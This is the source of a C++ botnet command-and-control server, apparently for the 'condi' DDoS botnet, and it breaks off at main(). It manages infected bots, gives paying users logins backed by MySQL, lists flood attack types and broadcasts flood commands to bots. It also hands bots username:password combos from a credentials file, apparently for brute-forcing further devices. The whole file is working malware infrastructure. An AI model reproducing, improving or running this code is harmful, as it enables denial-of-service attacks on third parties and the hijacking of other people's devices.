#include <iostream>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <thread>
#include <map>
#include <sstream>
#include <string>
#include <unistd.h>
#include <sys/epoll.h>
#include <errno.h>
#include <string.h>
#include <vector>
#include <iterator>

#include <fstream>
#include <algorithm>
#include <random>

#include "main.h"
#include "client.h"
#include "mysql.h"
#include "command.h"
#include "thread.h"

int creds_requested = 0;

static void terminate_client(int fd)
{
    if (client_list[fd].arch_len > 1)
        printf("\e[31m[-]\e[97m Connection terminated. (%d.%d.%d.%d) (%s)\n", client_list[fd].addr & 0xff, (client_list[fd].addr >> 8) & 0xff, (client_list[fd].addr >> 16) & 0xff, (client_list[fd].addr >> 24) & 0xff, client_list[fd].arch);

    epoll_ctl(efd, EPOLL_CTL_DEL, client_list[fd].fd, NULL);

    if(client_list[fd].fd != -1)
        close(client_list[fd].fd);

    client_list[fd].fd = -1;
    client_list[fd].connected = FALSE;
    client_list[fd].addr = 0;
    client_list[fd].authenticated = FALSE;
    client_list[fd].timeout = 0;
    client_list[fd].arch_len = 0;
    memset(client_list[fd].arch, 0, sizeof(client_list[fd].arch));

    return;
}

static void _exit(const char *str, int exit_code)
{
    std::cout << str << std::endl;
    exit(exit_code);
}

static void admin_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    admin_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!admin_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(ADMIN_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(admin_fd);
    REUSE_ADDR(admin_fd);

    ret = bind(admin_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the admin port", 1);
    }

    ret = listen(admin_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the admin port", 1);
    }

    return;
}

static void accept_cred_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    struct epoll_event e;
    int ret = 0;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
    {
        return;
    }

    e.data.fd = fd;
    e.events = EPOLLIN | EPOLLET;

    ret = epoll_ctl(efd, EPOLL_CTL_ADD, e.data.fd, &e);
    if(ret)
    {
        printf("Cannot accept cred connection\n");
        return;
    }

    return;
}

static void accept_client_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    struct epoll_event e;
    int ret = 0;
    //int x = 0;
    //BOOL d = FALSE;

    //std::cout << "Accepting connection..." << std::endl;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
    {
        return;
    }

    e.data.fd = fd;
    e.events = EPOLLIN | EPOLLET;

    ret = epoll_ctl(efd, EPOLL_CTL_ADD, fd, &e);
    if(ret)
    {
        printf("Cannot accept client connection\n");

        return;
    }

    // Slot the client into the list
    client_list[e.data.fd].fd = e.data.fd;
    client_list[e.data.fd].connected = TRUE;
    client_list[e.data.fd].addr = addr.sin_addr.s_addr;
    client_list[e.data.fd].authenticated = FALSE;
    client_list[e.data.fd].timeout = time(NULL);
    client_list[e.data.fd].arch_len = 0;
    memset(client_list[e.data.fd].arch, 0, sizeof(client_list[e.data.fd].arch));

    //cout << "Added the fd!" << endl;

    return;
}

static int parse_count(struct process *process)
{
    int count = 0;
    int x = 0;
    std::stringstream stream;
    std::string out;
    std::string n;

    stream << process->buf;

    std::getline(stream, out, ' ');
    n = out;

    process->f = process->buf;
    process->f.erase(0, n.length() + 1);

    n.erase(0, 1);

    count = atoi(n.c_str());

    if(count == 0 || (process->ptr->max_clients == -1 && count == -1) || (process->ptr->max_clients != -1 && count > process->ptr->max_clients) || (count > process->ptr->max_clients))
        return 0;

    process->count = count;
    return 1;
}

std::vector<std::string> split(const std::string& s, char delimiter)
{
    std::vector<std::string> tokens;
    std::string token;
    std::istringstream tokenStream(s);
    while (std::getline(tokenStream, token, delimiter))
    {
        tokens.push_back(token);
    }

    return tokens;
}

static void flood(struct command *ptr, struct process *process)
{
    int x = 0;
    int c = 0;
    struct relay data;

    data.type = TYPE_FLOOD;

    memset(data.buf, 0, sizeof(data.buf));

    memcpy(data.buf, ptr->buf, ptr->buf_len);

    for(x = 0; x < MAX_EVENTS; x++)
    {
        if(!client_list[x].authenticated || !client_list[x].connected)
            continue;
        send(client_list[x].fd, &data, sizeof(data), MSG_NOSIGNAL);
        c++;
        if(process->count != -1 && c == process->count)
            break;
    }

    return;
}

std::map<std::string, int> statistics(void)
{
    int i = 0;
    std::map<std::string, int> t;

    for(i = 0; i < MAX_EVENTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        t[client_list[i].arch]++;
    }

    return t;
}

int client_count(int max_clients)
{
    int i = 0;
    int x = 0;

    for(i = 0; i < MAX_EVENTS; i++)
    {
        if(!client_list[i].authenticated || !client_list[i].connected)
            continue;
        if(max_clients != -1 && x == max_clients)
            break;
        x++;
    }

    return x;
}

void *title_counter(void *arg)
{
    struct admin *login = (struct admin *)arg;
    struct admin p;

    while(TRUE)
    {
        std::stringstream title;

        p.username = login->username;
        mysql_set_restrictions(&p);

        title << "\033]0;";
        title << "Loaded: " << client_count(p.max_clients);
        title << "\007";

        send(login->fd, title.str().c_str(), title.str().length(), MSG_NOSIGNAL);
        sleep(1);
    }
}

static std::tuple<int, std::string> recv_line(int fd)
{
    int ret = 0;
    std::string str;

    while(1)
    {
        int np = 0;
        int rp = 0;
        char out[4096];

        memset(out, 0, sizeof(out));

        ret = recv(fd, out, sizeof(out), MSG_NOSIGNAL);
        if(ret <= 0)
        {
            return std::tuple<int, std::string>(ret, str);
        }

        str = out;

        np = str.find("\n");
        rp = str.find("\r");

        if(np != -1)
        {
            str.erase(np);
        }

        if(rp != -1)
        {
            str.erase(rp);
        }

        if(str.length() == 0)
        {
            continue;
        }

        break;
    }

    return std::tuple<int, std::string>(ret, str);
}

static void *admin_timeout_thread(void *arg)
{
    struct thread_data *tdata = (struct thread_data *)arg;

    pthread_barrier_wait(tdata->barrier);

    while(TRUE)
    {
        if(tdata->time + tdata->timeout < time(NULL))
        {
            close(tdata->fd);
            pthread_cancel(*tdata->admin_thread);
            break;
        }
        sleep(1);
    }

    pthread_exit(0);
}

int running_attack = FALSE;
int running_attack_time = time(NULL);
int running_attack_time_elapsed = 0;
int running_additional_timeout = 0;

static void *flood_timeout(void *arg)
{
    while (TRUE)
    {
        if (!running_attack && running_attack_time <= 0)
        {
            sleep(1);
            continue;
        }

        if (running_attack_time + FLOOD_TIMEOUT + running_additional_timeout <= time(NULL))
        {
            // Global cooldown has ended...
            running_attack = FALSE;
            running_attack_time = 0;
            running_attack_time_elapsed = 0;
            running_additional_timeout = 0;
            continue;
        }

        running_attack = TRUE;
        running_attack_time_elapsed++;
        sleep(1);
    }

    return nullptr;
}

static void *admin(void *arg)
{
    int fd = -1;
    std::stringstream stream;
    pthread_t counter;
    char user[4096];
    char pass[4096];
    struct admin login;
    int ffd = -1;
    char bbuf[4096];
    int load = 0;
    struct thread_data *tdata = (struct thread_data *)arg;
    struct thread_data t;
    pthread_barrier_t barrier;
    pthread_t admin_timeout;
    int ex = 0;
    int ret = 0;
    std::string banner;
    int np = 0;
    int rp = 0;
    std::tuple<int, std::string> line;

    pthread_barrier_wait(tdata->barrier);

    fd = tdata->fd;

    pthread_barrier_init(&barrier, NULL, 1);

    t.fd = fd;
    t.time = time(NULL);
    t.barrier = &barrier;
    t.admin_thread = tdata->admin_thread;
    t.timeout = 60;

    pthread_create(&admin_timeout, NULL, admin_timeout_thread, (void *)&t);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    ffd = open("banner.txt", O_RDONLY);
    if(ffd == -1)
    {
        std::cout << "Failed to open the banner file!" << std::endl;
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    if(strcmp(std::get<std::string>(line).c_str(), MANAGER_AUTH_KEY))
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
    send(fd, "\r", 1, MSG_NOSIGNAL);

    ret = read(ffd, bbuf, sizeof(bbuf));
    banner = bbuf;

    np = banner.find("\n");
    rp = banner.find("\r");

    if(np != -1)
    {
        banner.erase(np);
    }

    if(rp != -1)
    {
        banner.erase(rp);
    }

    send(fd, banner.c_str(), banner.length(), MSG_NOSIGNAL);
    send(fd, "\r\n", 2, MSG_NOSIGNAL);

    send(fd, "\e[93mUsername\e[31m:\e[97m ", 26, MSG_NOSIGNAL);

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(user, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());

    send(fd, "\e[93mPassword\e[31m:\e[97m ", 26, MSG_NOSIGNAL);

    line = recv_line(fd);

    if(std::get<int>(line) <= 0)
    {
        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    memcpy(pass, std::get<std::string>(line).c_str(), std::get<std::string>(line).length());

    login.user_ptr = user;
    login.pass_ptr = pass;

    send(fd, "\e[93mAuthenticating\e[0m", 23, MSG_NOSIGNAL);
    for(load = 0; load < 2; load++)
    {
        send(fd, "\e[31m.\e[0m", 10, MSG_NOSIGNAL);
        sleep(1);
    }
    send(fd, "\r\n", 2, MSG_NOSIGNAL);

    if(!mysql_login(&login))
    {
        send(fd, "\e[93mAuthentication failure\e[31m!\e[0m\r\n", 39, MSG_NOSIGNAL);

        close(fd);
        pthread_cancel(admin_timeout);
        pthread_exit(0);
    }

    send(fd, "\e[93mAuthentication successful\e[31m!\e[0m\r\n\r\n", 44, MSG_NOSIGNAL);

    // Terminate the admin timeout thread
    pthread_cancel(admin_timeout);

    login.fd = fd;

    mysql_set_restrictions(&login);

    // If we are already authenticated close the connection
    if(login.authenticated)
    {
        send(fd, "\e[93mUser already authenticated\e[31m!\e[0m\r\n", 43, MSG_NOSIGNAL);
        close(fd);
        pthread_exit(0);
    }

    mysql_update_login(&login, 1);

    // User has been disabled for a indefinite amount of time
    if(login.disable)
    {
        send(fd, "\e[93mUser has been disabled\e[31m!\e[0m\r\n", 39, MSG_NOSIGNAL);
        close(fd);
        pthread_exit(0);
    }

    stream << "[38;5;7m";
    stream << login.username;
    stream << "[38;5;1m@[38;5;3mcondi";
    stream << "[38;5;1m#[38;5;7m ";

    // Spawn a thread to update a active title counter
    pthread_create(&counter, NULL, title_counter, (void *)&login);

    while(TRUE)
    {
        char buf[4096];
        struct process process;
        struct command *ptr;
        int x = 0;
        std::string data;
        int g = 0;
        int count = 0;
        int np = 0;
        int rp = 0;

        memset(buf, 0, sizeof(buf));

        // Send the admin a fake prompt for user input
        ret = send(fd, stream.str().c_str(), stream.str().length(), MSG_NOSIGNAL);

        if(ret <= 0)
        {
            break;
        }

        g = recv(fd, buf, sizeof(buf), MSG_NOSIGNAL);

        if(g <= 0)
        {
            break;
        }

        data = buf;

        np = data.find("\n");
        rp = data.find("\r");

        if(np != -1)
        {
            data.erase(np);
        }

        if(rp != -1)
        {
            data.erase(rp);
        }

        if(data == "")
        {
            continue;
        }

        mysql_set_restrictions(&login);

        count = client_count(login.max_clients);

        if(login.disable)
        {
            send(fd, "\e[93mUser has been disabled\e[31m!\e[0m\r\n", 39, MSG_NOSIGNAL);
            break;
        }

        if(data == "?" || data == "help")
        {
            std::stringstream help_stream;

            help_stream << "[38;5;7mAttack vectors:\r\n";
            help_stream << "[38;5;7m - [38;5;3mudpflood[38;5;1m: [38;5;7mUDP flood with less options, optimized for higher GBPS\r\n";
            help_stream << "[38;5;7m - [38;5;3msynflood[38;5;1m: [38;5;7mSYN flood\r\n";
            help_stream << "[38;5;7m - [38;5;3mackflood[38;5;1m: [38;5;7mACK flood\r\n";
            help_stream << "[38;5;7m - [38;5;3mtcpstomp[38;5;1m: [38;5;7mTCP handshake flood\r\n";
            help_stream << "[38;5;7m - [38;5;3mudpfivem[38;5;1m: [38;5;7mUDP Flood custom for fivem server\r\n";
            help_stream << "\r\n";
            help_stream << "[38;5;7m - [38;5;3mudpbypass[38;5;1m: [38;5;7mUDP bypass IP flood\r\n";
            help_stream << "[38;5;7m - [38;5;3mipsec[38;5;1m: [38;5;7mGRE IP flood for bypassing\r\n";
            help_stream << "[38;5;7m - [38;5;3mtcpmix[38;5;1m: [38;5;7mTCP flood with SYN+ACK\r\n";
            help_stream << "[38;5;7m - [38;5;3mhex[38;5;1m: [38;5;7mUDP flood with hex data\r\n";

            send(fd, help_stream.str().c_str(), help_stream.str().length(), MSG_NOSIGNAL);

            continue;
        }

        if ((data == "admin") && login.admin == TRUE)
        {
            std::stringstream admin_stream;
            
            admin_stream << "\e[93mClient management (Requires the admin password)\e[31m:\r\n";
            admin_stream << "\e[93mclients show\e[31m:\e[97m Show all registered clients.\r\n";
            admin_stream << "\e[93mclients <disable/enable> <username>\e[31m:\e[97m Disable or enable a user.\r\n";
            admin_stream << "\e[93mclients remove <username>\e[31m:\e[97m Remove a user.\r\n";
            admin_stream << "\e[93mclients add <username> <password> <max clients> <max_time> <cooldown> <concurrent> <disable> <admin>\e[31m:\e[97m Add a client.\r\n";                
            admin_stream << "\r\n";
            admin_stream << "\e[93mOther commands\e[31m:\r\n";
            admin_stream << "\e[93mshow attacks\e[31m:\e[97m Show all running attacks.\r\n";
            admin_stream << "\r\n";

            send(fd, admin_stream.str().c_str(), admin_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if(data == "bots")
        {
            std::stringstream count_stream;

            count_stream << "[38;5;7mTotal botcount[38;5;1m:[38;5;7m " << count;
            count_stream << "\r\n";

            send(fd, count_stream.str().c_str(), count_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }

        if(data == "clear" || data == "cls")
        {
            send(fd, "\033[2J\033[H", 8, MSG_NOSIGNAL);
            continue;
        }

        if((data == "stats" || data == "statistics") && login.admin == TRUE)
        {
            std::map<std::string, int> stats;
            std::map<std::string, int>::iterator stats_iterator;
            std::stringstream stats_stream;

            stats = statistics();

            if(stats.empty())
            {
                send(fd, "No clients connected to view statistics\r\n", 41, MSG_NOSIGNAL);
                continue;
            }

            stats_stream << "\r\n";

            for(stats_iterator = stats.begin(); stats_iterator != stats.end(); stats_iterator++)
            {
                stats_stream << "[38;5;7m" << stats_iterator->first << "[38;5;1m:[38;5;7m " << stats_iterator->second << "";
                stats_stream << "\r\n";
            }

            stats_stream << "\r\n";
            stats_stream << "[38;5;7mCredentials requested[38;5;1m:[38;5;7m " << creds_requested << "\r\n";

            send(fd, stats_stream.str().c_str(), stats_stream.str().length(), MSG_NOSIGNAL);

            continue;
        }

        if (split(data, ' ').size() > 0 && login.admin == TRUE)
        {
            if (split(data, ' ')[0] == "clients")
            {
                if (split(data, ' ').size() > 1)
                {
                    send(fd, "\e[93mPassword\e[31m:\e[97m ", 25, 0);
                    line = recv_line(fd);

                    if(std::get<int>(line) <= 0)
                    {
                        send(fd, "\e[31mClient management requires a password.\r\n", 45, 0);
                        continue;
                    }

                    if(strcasecmp(std::get<std::string>(line).c_str(), ADMIN_AUTH_KEY))
                    {
                        send(fd, "\e[31mIncorrect password, this has been logged.\r\n", 48, 0);
                        continue;
                    }

                    if(split(data, ' ')[1] == "show")
                    {
                        mysql_get_client_information(&login);
                        continue;
                    }

                    if(split(data, ' ')[1] == "enable" || split(data, ' ')[1] == "disable")
                    {
                        if (split(data, ' ').size() > 2)
                        {
                            if(strlen(split(data, ' ')[2].c_str()) > 0)
                            {
                                mysql_update_disable(&login, split(data, ' ')[2].c_str(), (split(data, ' ')[1] == "enable" ? 0 : 1));
                                continue;
                            }
                        }

                        std::string info = "Usage: enable/disable username\r\n";
                        send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                    }

                    if(split(data, ' ')[1] == "add")
                    {
                        if (split(data, ' ').size() != 12)
                        {
                            std::string info = "Usage: clients add username password max_clients max_time cooldown concurrent disable admin authenticated banned reason\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }
                        
                        mysql_add_user(split(data, ' ')[2].c_str(), split(data, ' ')[3].c_str(), 
                                        atoi(split(data, ' ')[4].c_str()), atoi(split(data, ' ')[5].c_str()), 
                                            atoi(split(data, ' ')[6].c_str()), atoi(split(data, ' ')[7].c_str()), 
                                                atoi(split(data, ' ')[8].c_str()), atoi(split(data, ' ')[9].c_str()),
                                                atoi(split(data, ' ')[10].c_str()), atoi(split(data, ' ')[11].c_str()),
                                                atoi(split(data, ' ')[12].c_str()));

                    }

                    if(split(data, ' ')[1] == "remove")
                    {
                        if (split(data, ' ').size() != 3)
                        {
                            std::string info = "Usage: clients remove username\r\n";
                            send(fd, info.c_str(), info.length(), MSG_NOSIGNAL);
                            continue;
                        }

                        if (split(data, ' ')[2] == login.username)
                            continue;

                        mysql_remove_user(split(data, ' ')[2].c_str());

                    }
                }

                continue;
            }

            if (split(data, ' ')[0] == "show")
            {
                if (split(data, ' ').size() > 1)
                {
                    if(split(data, ' ')[1] == "attacks")
                    {
                        (fd);
                        continue;
                    }
                }

                continue;
            }
        }

        if(count == 0)
        {
            send(fd, "No clients connected to command\r\n", 33, MSG_NOSIGNAL);
            continue;
        }

        process.buf = data;
        process.buf_len = data.length();
        process.fd = fd;
        process.ptr = &login;
        process.count = login.max_clients;

        std::string flood_str;
        std::stringstream info_stream;

        // Parse the desired client count here
        if(data[0] == '.')
        {
            if(!parse_count(&process))
            {
                send(fd, "Invalid count specified\r\n", 25, MSG_NOSIGNAL);
                continue;
            }
            process.buf = process.f;
        }

        if (!running_attack)
        {
            ptr = command_process(&process);
            if(!ptr)
            {
                continue;
            }

            flood(ptr, &process);
            running_attack = TRUE;
            running_attack_time = time(NULL);
            running_additional_timeout = ptr->time;
        }
        else
        {
            info_stream << "Please wait " << running_attack_time_elapsed << "/" << (FLOOD_TIMEOUT + running_additional_timeout) << " Until launching next attack" << "\r\n";
            send(fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);
            continue;
        }
        
        
        info_stream << "[38;5;10mattack broadcasted to " << (process.count == -1 ? count : process.count) << " bots.\r\n";
        send(fd, info_stream.str().c_str(), info_stream.str().length(), MSG_NOSIGNAL);
        
        free(ptr->buf);
        free(ptr);
    }

    pthread_cancel(counter);
    mysql_update_login(&login, 0);
    close(fd);
    pthread_exit(0);
}

static void accept_admin_connection(struct epoll_event *es, int efd)
{
    int fd = -1;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    pthread_t thread;
    struct thread_data tdata;
    pthread_barrier_t barrier;

    //cout << "Accepting admin connection..." << endl;

    fd = accept(es->data.fd, (struct sockaddr *)&addr, &addr_len);
    if(fd == -1)
        return;

    //cout << "Accepted admin connection!" << endl;

    tdata.fd = fd;

    pthread_barrier_init(&barrier, NULL, 2);

    tdata.barrier = &barrier;
    tdata.admin_thread = &thread;

    pthread_create(&thread, NULL, admin, (void *)&tdata);

    pthread_barrier_wait(&barrier);
    pthread_barrier_destroy(&barrier);

    //cout << "Admin thread spawned!" << endl;

    return;
}

static void verify_client(struct epoll_event *es, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    uint16_t len = 0;
    char *buf;

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 != 128 && b2 != 90 && b3 != 87 && b4 != 200 && b5 != 240 && b6 != 30)
    {
        return;
    }

    buf = data->buf;

    len = *(uint16_t *)buf;

    len = ntohs(len);

    if(len > sizeof(data->buf))
    {
        return;
    }

    buf += sizeof(uint16_t);

    client_list[es->data.fd].arch_len = len;
    memcpy(client_list[es->data.fd].arch, buf, client_list[es->data.fd].arch_len);
    client_list[es->data.fd].authenticated = TRUE;

    printf("\e[92m[+]\e[97m Accepted connection. (%d.%d.%d.%d) (%s)\n", client_list[es->data.fd].addr & 0xff, (client_list[es->data.fd].addr >> 8) & 0xff, (client_list[es->data.fd].addr >> 16) & 0xff, (client_list[es->data.fd].addr >> 24) & 0xff, client_list[es->data.fd].arch);

    return;
}

bool getFileContent(std::string fileName, std::vector<std::string> & vecOfStrs)
{
 
    // Open the File
    std::ifstream in(fileName.c_str());
 
    // Check if object is valid
    if(!in)
    {
        std::cerr << "Cannot open the File : "<<fileName<<std::endl;
        return false;
    }
 
    std::string str;

    // Read the next line from File untill it reaches the end.
    while (std::getline(in, str))
    {
        // Line contains string of length > 0 then save it in vector
        if(str.size() > 0)
            vecOfStrs.push_back(str);
    }

    //Close The File
    in.close();
    return true;
}

using namespace std;

vector<string> splits(const string& str, const string& delim)
{
    vector<string> tokens;
    size_t prev = 0, pos = 0;
    do
    {
        pos = str.find(delim, prev);
        if (pos == string::npos) pos = str.length();
        string token = str.substr(prev, pos-prev);
        if (!token.empty()) tokens.push_back(token);
        prev = pos + delim.length();
    }
    while (pos < str.length() && prev < str.length());
    return tokens;
}

static void verify_request(struct epoll_event *es, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;
    uint16_t count = 0;
    char *buf;
    
    std::vector<std::string> combo_vector;
    getFileContent("creds.txt", combo_vector);
    std::random_shuffle(combo_vector.begin(), combo_vector.end());

    auto rng = std::default_random_engine {};
    std::shuffle(std::begin(combo_vector), std::end(combo_vector), rng);

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 != 128 && b2 != 90 && b3 != 87 && b4 != 200 && b5 != 240 && b6 != 30)
    {
        epoll_ctl(efd, EPOLL_CTL_DEL, es->data.fd, NULL);
        close(es->data.fd);        
        return;
    }

    buf = data->buf;

    count = *(uint16_t *)buf;

    count = ntohs(count);

    printf("\e[92m[+]\e[97m Client requested %d credentials\n", count);

    uint8_t size = 4;
    int x = 0;

    char bufs[256];
    char buffer[2056];
    int g = 0;

    memset(buffer, 0, sizeof(buffer));

    x = 0;
    for(std::string & line : combo_vector) 
    {
        std::vector<std::string> combo = splits(line, ":");
        
        std::string username = combo[0];
        std::string password = "";

        if (combo.size() == 2)
            password = combo[1];

        uint8_t user_len = username.length();
        uint8_t pass_len = password.length();

        memset(bufs, 0, sizeof(bufs));

        memcpy(bufs, &user_len, sizeof(uint8_t));
        memcpy(bufs + sizeof(uint8_t), username.c_str(), username.length());
        memcpy(bufs + sizeof(uint8_t) + username.length(), &pass_len, sizeof(uint8_t));
        memcpy(bufs + sizeof(uint8_t) + username.length() + sizeof(uint8_t), password.c_str(), password.length());
        memcpy(buffer + g, &bufs, sizeof(bufs));
        g += sizeof(uint8_t) + username.length() + sizeof(uint8_t) + password.length();
        
        if ((x++) >= count)
            break;
    }

    send(es->data.fd, &buffer, sizeof(buffer), 0);
    
    creds_requested++;

    epoll_ctl(efd, EPOLL_CTL_DEL, es->data.fd, NULL);
    if (es->data.fd > 0)
        close(es->data.fd);

    return;
}

static void parse_command(int fd, struct relay *data)
{
    uint16_t b1, b2, b3, b4, b5, b6 = 0;

    b1 = ntohs(data->b1);
    b2 = ntohs(data->b2);
    b3 = ntohs(data->b3);
    b4 = ntohs(data->b4);
    b5 = ntohs(data->b5);
    b6 = ntohs(data->b6);

    if(b1 == 8890 && b2 == 5412 && b3 == 6767 && b4 == 1236 && b5 == 8092 && b6 == 3334)
    {
        // Relay the data back to the client
        send(fd, data, sizeof(struct relay), MSG_NOSIGNAL);
    }

    return;
}

static void process_event(struct epoll_event *es, int efd)
{
    int len = 0;
    struct relay data;

    memset(&data, 0, sizeof(struct relay));
    
    if((es->events & EPOLLERR) || (es->events & EPOLLHUP) || (!(es->events & EPOLLIN)))
    {
        terminate_client(es->data.fd);
        return;
    }

    if(es->data.fd == cred_fd)
    {
        accept_cred_connection(es, efd);
        return;
    }

    if(es->data.fd == admin_fd)
    {
        accept_admin_connection(es, efd);
        return;
    }

    if(es->data.fd == client_fd)
    {
        accept_client_connection(es, efd);
        return;
    }    

    errno = 0;
    // Always read in
    len = recv(es->data.fd, &data, sizeof(struct relay), MSG_NOSIGNAL);

    if(len <= 0)
    {
        terminate_client(es->data.fd);
        return;
    }

    if(data.type == TYPE_AUTH && !client_list[es->data.fd].authenticated)
    {
        verify_client(es, &data);
    }

    if(data.type == TYPE_CRED)
    {
        verify_request(es, &data);
        return;
    }

    if(!client_list[es->data.fd].authenticated)
    {
        terminate_client(es->data.fd);
        return;
    }

    client_list[es->data.fd].timeout = time(NULL);

    if(data.type == TYPE_COMMAND)
    {
        parse_command(es->data.fd, &data);
    }

    return;
}

static void *client_timeout(void *arg)
{
    int i = 0;

    while(TRUE)
    {
        for(i = 0; i < MAX_EVENTS; i++)
        {
            if(!client_list[i].connected || !client_list[i].authenticated)
                continue;
            /*if(!client_list[i].authenticated && client_list[i].timeout + VERIFY_TIMEOUT < time(NULL))
            {
                printf("Client timed out on the verification process (%d.%d.%d.%d)\n", client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff);
                terminate_client(client_list[i].fd);
                continue;
            }*/
            if(client_list[i].timeout + TIMEOUT < time(NULL))
            {
                //printf("\e[31m[-]\e[97m Connection timeout. (%d.%d.%d.%d)\n", client_list[i].addr & 0xff, (client_list[i].addr >> 8) & 0xff, (client_list[i].addr >> 16) & 0xff, (client_list[i].addr >> 24) & 0xff);
                terminate_client(client_list[i].fd);
                continue;
            }
        }

        sleep(1);
    }
}

static void client_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!client_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(CLIENT_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(client_fd);
    REUSE_ADDR(client_fd);

    ret = bind(client_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the client port", 1);
    }

    ret = listen(client_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the client port", 1);
    }

    return;
}

static void cred_bind(void)
{
    struct sockaddr_in addr;
    int ret = 0;

    cred_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(!cred_fd)
    {
        _exit("Failed to create a TCP socket", 1);
    }

    addr.sin_family = AF_INET;
    addr.sin_port = htons(CRED_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    NONBLOCK(cred_fd);
    REUSE_ADDR(cred_fd);

    ret = bind(cred_fd, (struct sockaddr *)&addr, sizeof(addr));
    if(ret)
    {
        _exit("Failed to bind to the client port", 1);
    }

    ret = listen(cred_fd, 0);
    if(ret)
    {
        _exit("Failed to listen on the client port", 1);
    }

    printf("Listening on port %d\n", CRED_PORT);

    return;
}

static void epoll_handler(void)
{
    //int efd = -1;

    struct epoll_event client_event;
    struct epoll_event admin_event;
    struct epoll_event cred_event;

    int ret = -1;
    struct epoll_event *es;
    int x = 0;
    pthread_t client_timeout_thread;
    pthread_t flood_timeout_thread;

    //cout << "Started the epoll handler..." << endl;

    efd = epoll_create1(0);
    if(efd == -1)
    {
        _exit("Failed to create the epoll fd", 1);
    }

    // Client CTL
    client_event.data.fd = client_fd;
    client_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, client_fd, &client_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }
    // Client CTL


    // Admin CTL
    admin_event.data.fd = admin_fd;
    admin_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, admin_fd, &admin_event);
    if(ret)
    {
        _exit("Failed to add the fd to epoll", 1);
    }
    // Admin CTL

    // Cred CTL
    cred_event.data.fd = cred_fd;
    cred_event.events = EPOLLIN | EPOLLET;
    ret = epoll_ctl(efd, EPOLL_CTL_ADD, cred_fd, &cred_event);
    if(ret)
    {
        printf("FAiled\n");
        _exit("Failed to add the fd to epoll", 1);
    }
    // Cred CTL


    //cout << "Added the fds to epoll!" << endl;

    // Allocate memory for the client list
    client_list = (struct clients *)calloc(MAX_EVENTS, sizeof(struct clients));
    if(!client_list)
    {
        _exit("Failed to allocate memory for the client list", 1);;
    }

    for(x = 0; x < MAX_EVENTS; x++)
    {
        client_list[x].fd = -1;
        client_list[x].connected = FALSE;
        client_list[x].addr = 0;
        client_list[x].authenticated = FALSE;
        client_list[x].timeout = 0;
        client_list[x].arch_len = 0;
        memset(client_list[x].arch, 0, 64);
    }

    es = (struct epoll_event *)calloc(MAX_EVENTS, sizeof(struct epoll_event));
    if(!es)
    {
        _exit("Failed to allocate memory for the epoll events", 1);
    }

    //cout << "Allocated memory!" << endl;

    // Spawn the timeout thread
    pthread_create(&client_timeout_thread, NULL, client_timeout, NULL);
    pthread_create(&flood_timeout_thread, NULL, flood_timeout, NULL);

    // Start the main event loop
    while(TRUE)
    {
        int n = 0;
        int i = 0;
        int cfd = -1;

        n = epoll_wait(efd, es, MAX_EVENTS, -1);
        if(n == -1)
        {
            std::cout << "Epoll error" << std::endl;
            break;
        }

        for(i = 0; i < n; i++)
            process_event(&es[i], efd);
    }

    free(es);
    free(client_list);
    close(efd);
    _exit("Epoll finished", 1);
}

int main(void)
{
